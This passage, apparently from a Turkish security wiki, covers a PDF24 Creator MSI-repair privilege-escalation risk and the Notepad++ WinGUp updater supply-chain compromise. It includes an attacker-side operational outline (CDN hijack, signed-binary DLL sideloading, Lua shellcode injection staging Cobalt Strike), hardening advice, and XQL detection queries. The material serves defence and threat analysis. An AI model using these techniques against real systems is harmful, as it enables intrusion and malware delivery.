PDF24 Creator 11.15.1, farklı bir MSI-repair riskini ortaya koyuyor: yazıcı yükleme custom action'ı, repair sırasında SYSTEM yetkileriyle görünür bir konsol başlatabiliyor. Üretici, bu davranışı gidermek için MSI installer'ı 11.15.2'de değiştirdi. Ürünün eski bir sürümü yalnızca bir triage ipucudur. Kayıtlı veya erişilebilir MSI paketini, bu kullanıcının repair başlatıp başlatamayacağını, savunmasız custom action'ın ve log-file delay'in mevcut olup olmadığını ve etkileşimli bir masaüstünün konsolu gösterip gösteremeyeceğini kontrol edin. Bildirilen gecikme, `faxPrnInst.log` üzerinde bir oplock kullanıyordu; sıradan dosya yazma izni tek erişim koşulu değildir. Etkileşimsiz bir shell, erişilemeyen bir paket veya yamalanmış bir installer zinciri bozabilir. Bu sorun `AlwaysInstallElevated`'a bağlı değildir ve öngörülebilir bir geçici script'i değiştirmekten farklıdır.

---
## Zayıf updater doğrulaması yoluyla uzaktan supply-chain hijack (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ update akışının arkasındaki hosting altyapısını ele geçiren saldırganlar, seçtikleri kurbanlara özel olarak kötü amaçlı manifest'ler sundu. WinGUp tabanlı eski updater'lar update'in gerçekliğini tam olarak doğrulamıyordu; bu nedenle kötü niyetli bir XML yanıtı, istemcileri saldırganların kontrolündeki URL'lere yönlendirebiliyordu. İstemci, hem güvenilir bir sertifika zincirini zorunlu kılmadan hem de indirilen installer'da geçerli bir PE imzası aramadan HTTPS içeriğini kabul ettiği için kurbanlar trojan'laştırılmış bir NSIS `update.exe` indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operasyonel akış (yerel exploit gerekmez):
1. **Altyapının araya alınması**: CDN/hosting altyapısını ele geçirin ve update kontrollerine, kötü amaçlı bir indirme URL'sini gösteren saldırgan metadata'sıyla yanıt verin.
2. **Trojan'laştırılmış NSIS**: Installer bir payload indirip çalıştırır ve iki execution chain'i kötüye kullanır:
   - **Kendi imzalı binary'sini getir + sideload**: imzalı Bitdefender `BluetoothService.exe` dosyasını pakete ekleyin ve arama yoluna kötü amaçlı bir `log.dll` bırakın. İmzalı binary çalıştığında Windows, Chrysalis backdoor'unu (statik tespiti zorlaştırmak için Warbird korumalı + API hashing kullanan) çözüp reflectively yükleyen `log.dll` dosyasını sideload eder.
   - **Script'li shellcode injection**: NSIS, shellcode enjekte etmek ve Cobalt Strike Beacon'ı hazırlamak için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua script'i çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için hardening/detection çıkarımları:
- İndirilen installer için **sertifika + imza doğrulamasını** zorunlu kılın (vendor signer'ı pin'leyin, eşleşmeyen CN/zinciri reddedin) ve update manifest'inin kendisini imzalayın (ör. XMLDSig). Manifest'in kontrol ettiği yönlendirmeleri doğrulanmadıkları sürece engelleyin.
- **BYO signed binary sideloading** olayını indirme sonrası bir detection pivot'u olarak ele alın: imzalı bir vendor EXE'nin kanonik kurulum yolu dışındaki bir DLL adını yüklemesi (ör. Bitdefender'ın Temp/Downloads konumundan `log.dll` yüklemesi) ve bir updater'ın Temp'e vendor imzası taşımayan installer'lar bırakıp çalıştırması durumlarında uyarı verin.
- Bu zincirde gözlemlenen **malware'e özgü artefaktları** izleyin (genel pivot'lar olarak faydalıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan anormal `gup.exe` yazmaları ve Lua tarafından yürütülen shellcode injection aşamaları.
- Notepad++, v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirerek yanıt verdi: döndürülen XML artık imzalanıyor (XMLDSig) ve yeni sürümler, yalnızca aktarım katmanına güvenmek yerine indirilen installer için sertifika + imza doğrulamasını zorunlu kılıyor.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender imzalı EXE'nin <code>log.dll</code> dosyasını sideload etmesi (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ dışı bir yükleyiciyi başlatıyor</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Bu kalıplar, imzasız manifestleri kabul eden veya yükleyici imzalayanlarını sabitlemeyen tüm updater'lar için geçerlidir: ağın ele geçirilmesi + kötü amaçlı yükleyici + BYO imzalı sideloading, “güvenilir” güncellemeler kisvesi altında uzaktan kod yürütmeyle sonuçlanır.

---
## References
- [1] [Danışma – Windows için Netskope Client – Sahte Sunucu Üzerinden Yerel Yetki Yükseltme (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Güvenlik Danışma Belgesi NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope eklentisi](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC istemcisi/exploit'i](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4'ü pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar üzerinden yerel yetki yükseltme](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta yetki yükseltme](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Devlet destekli aktörler Notepad++ tedarik zincirinden yararlanıyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ele geçirilen altyapı olayıyla ilgili güncelleme](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows için Netskope Client'ta CVE-2025-0309 düzeltmesini atlatma](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'daki yetki yükseltme hatalarının ortaya çıkarılması](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
